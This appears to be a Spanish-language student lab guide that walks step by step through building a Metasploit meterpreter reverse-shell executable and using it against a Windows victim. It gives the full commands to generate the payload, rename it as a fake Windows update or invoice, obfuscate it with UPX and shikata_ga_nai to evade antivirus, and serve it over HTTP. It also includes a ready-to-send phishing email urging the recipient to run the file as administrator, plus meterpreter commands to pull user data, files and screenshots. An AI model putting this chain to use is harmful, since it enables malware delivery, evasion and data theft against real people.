# Practica 04 - Payload con Metasploit

Grupo 04

---

## De que trata

Generar un archivo malicioso con Metasploit que parezca legitimo, enviarlo a la victima por correo o red social, y una vez ejecutado extraer informacion del sistema: datos del equipo, SID del usuario, nombre del usuario actual y listado del directorio.

---

## Herramientas

| Herramienta | Para que sirve |
|---|---|
| `msfvenom` | Generar el payload (el archivo malicioso) |
| `msfconsole` | Recibir la conexion y controlar el equipo victima |
| `upx` | Comprimir el ejecutable para dificultar deteccion |

---

## Paso a paso

### Paso 1: Conocer la IP de Kali

La victima se va a conectar de vuelta a Kali cuando ejecute el archivo. Kali tiene que saber su propia IP:

```bash
ip a
```

Anotar la IP (por ejemplo `192.168.100.10`). Esa se usa en el siguiente paso.

### Paso 2: Generar el payload con msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.10 \
  LPORT=4444 \
  -f exe \
  -o actualizacion_sistema.exe
```

Que hace cada parte:
- `-p windows/meterpreter/reverse_tcp` → tipo de payload. Cuando la victima lo ejecuta, se conecta sola de vuelta a Kali
- `LHOST` → IP de Kali (hacia donde se conecta la victima)
- `LPORT` → puerto donde Kali escucha (puede ser cualquiera, 4444 es el comun)
- `-f exe` → formato del archivo de salida (ejecutable de Windows)
- `-o actualizacion_sistema.exe` → nombre del archivo generado

### Paso 3: Hacer el archivo menos sospechoso

Renombrarlo con algo creible:

```bash
mv actualizacion_sistema.exe "Actualizacion_Windows_KB5034441.exe"
```

Opciones de nombres que generan confianza:
- `Actualizacion_Windows_KB5034441.exe`
- `Adobe_Reader_Update.exe`
- `Reporte_Noviembre_2024.exe`
- `Factura_001234.exe`

Comprimir con UPX para reducir el tamano y cambiar la firma del archivo:

```bash
sudo apt install upx -y
upx --best "Actualizacion_Windows_KB5034441.exe"
```

Generar con un encoder para dificultar la deteccion del antivirus:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.10 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe \
  -o "Actualizacion_Windows_KB5034441.exe"
```

- `-e x86/shikata_ga_nai` → encoder que ofusca el codigo
- `-i 5` → pasar el encoder 5 veces (mas iteraciones = mas dificil de detectar)

### Paso 4: Preparar el listener en Kali

Antes de enviar el archivo a la victima, Kali tiene que estar escuchando en el puerto 4444:

```bash
sudo msfconsole
```

Dentro de msfconsole:

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
set LPORT 4444
run
```

Kali queda esperando. Cuando la victima ejecute el archivo, aparece automaticamente la sesion de meterpreter.

### Paso 5: Enviar el archivo a la victima

Opciones para entregarlo:

**Por correo:**
Adjuntar el .exe en un correo con un pretexto creible.

Ejemplo de mensaje:

```
Asunto: Actualizacion importante de seguridad - Accion requerida

Se ha detectado una vulnerabilidad critica en los equipos de la 
organizacion. Para proteger tu equipo debes instalar la actualizacion 
adjunta antes de las 5pm de hoy.

Instrucciones:
1. Descargar el archivo adjunto
2. Ejecutarlo como administrador
3. Seguir los pasos en pantalla

Soporte Tecnico
```

**Por red compartida:**
Si estan en la misma red, compartir el archivo por carpeta compartida o transferirlo con Python:

```bash
# Desde Kali, servir el archivo por HTTP
python3 -m http.server 8080
```

La victima descarga desde: `http://192.168.100.10:8080/Actualizacion_Windows_KB5034441.exe`

### Paso 6: Recibir la conexion y extraer informacion

Cuando la victima ejecuta el archivo, en msfconsole aparece:

```
[*] Sending stage (175686 bytes) to 192.168.100.50
[*] Meterpreter session 1 opened
meterpreter >
```

Ahora se extraen los datos que pide la practica:

**Informacion del sistema:**

```
meterpreter > sysinfo
```

Muestra: nombre del equipo, sistema operativo, arquitectura, idioma, dominio.

**SID del usuario:**

```
meterpreter > getuid
meterpreter > shell
```

Dentro del shell de Windows:

```cmd
whoami /user
```

Eso da el nombre del usuario y su SID completo. Ejemplo:

```
COMPUTADORA\usuario  S-1-5-21-1234567890-1234567890-1234567890-1001
```

**Nombre del usuario actual:**

```
meterpreter > getuid
```

O dentro del shell:

```cmd
whoami
echo %username%
```

**Listado del directorio actual:**

```
meterpreter > ls
meterpreter > pwd
```

O dentro del shell de Windows:

```cmd
dir
cd %userprofile%
dir
```

Para salir del shell de Windows y volver a meterpreter:

```
exit
```

### Paso 7: Guardar la informacion obtenida

Desde meterpreter, descargar archivos del equipo victima:

```
meterpreter > download C:\\Users\\victima\\Desktop\\archivo.txt
```

Capturar screenshot de la pantalla de la victima:

```
meterpreter > screenshot
```

Ver procesos corriendo:

```
meterpreter > ps
```

---

## Resumen de comandos de meterpreter utiles

| Comando | Que hace |
|---|---|
| `sysinfo` | Info del sistema (OS, hostname, arquitectura) |
| `getuid` | Usuario actual |
| `getpid` | ID del proceso de meterpreter |
| `shell` | Abrir shell de Windows (cmd) |
| `ls` | Listar archivos del directorio actual |
| `pwd` | Ver ruta del directorio actual |
| `cd ruta` | Cambiar de directorio |
| `download archivo` | Descargar archivo del equipo victima |
| `upload archivo` | Subir archivo al equipo victima |
| `screenshot` | Tomar captura de pantalla |
| `ps` | Ver procesos corriendo |
| `migrate PID` | Moverse a otro proceso (para persistencia) |
| `exit` | Cerrar la sesion |

---

## Instalar lo que falte

Metasploit ya viene en Kali. Si algo no carga:

```bash
sudo apt update
sudo apt install metasploit-framework -y
sudo msfdb init
```
